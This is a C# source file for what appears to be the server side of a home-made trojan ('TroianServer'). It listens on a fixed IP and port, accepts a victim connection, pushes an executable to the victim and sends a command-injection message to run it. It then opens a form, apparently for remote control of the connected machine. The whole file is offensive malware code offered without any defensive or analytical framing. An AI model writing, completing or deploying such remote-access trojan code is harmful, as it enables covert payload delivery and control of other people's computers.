using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;

namespace TroianServer
{
    class Program
    {
        static void Navigate(NetworkStream stream)
        {
          
        }
        [STAThread]
        static void Main(string[] args)
        {
            TcpListener server = new TcpListener(System.Net.IPAddress.Parse("192.168.21.89"), 30021);
            TcpClient client;
            String username;

            try
            {
                server.Start();
                Console.WriteLine("Waiting for a connection...");
                client = server.AcceptTcpClient();
                NetworkStream stream = client.GetStream();
                username = Messages.ReceiveMessage(stream);
                Console.WriteLine("Connected!");

                int bytes_sent = -1;
                Byte[] bytes = new Byte[1024];

                try
                {
                    FileStream fs = new FileStream("C:\\Users\\Mihai\\Desktop\\Procc.exe", FileMode.Open, FileAccess.Read);
                    Messages.SendMessage(stream, Constants.SENDFILE + "@" + "C:\\Users\\alexa\\Desktop\\Procc.exe");
                    String check = Messages.ReceiveMessage(stream);

                    if (check.Equals("N"))
                    {
                        goto here;
                    }

                    while (bytes_sent != 0)
                    {
                        bytes_sent = fs.Read(bytes, 0, bytes.Length);
                        Messages.SendMessage(stream, bytes_sent.ToString());
                        Messages.ReceiveMessage(stream);
                        stream.Write(bytes, 0, bytes_sent);
                        Messages.ReceiveMessage(stream);
                    }
                }
                catch (Exception) { }

                Messages.SendMessage(stream, Constants.CMDINJECT + "@" + "C:\\Users\\alexa\\Desktop\\Procc.exe");

                here:
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new Form1(stream));

                client.Close();
            }
            catch (Exception e) {
                Console.WriteLine(e.Message);
            }
        }
    }
}
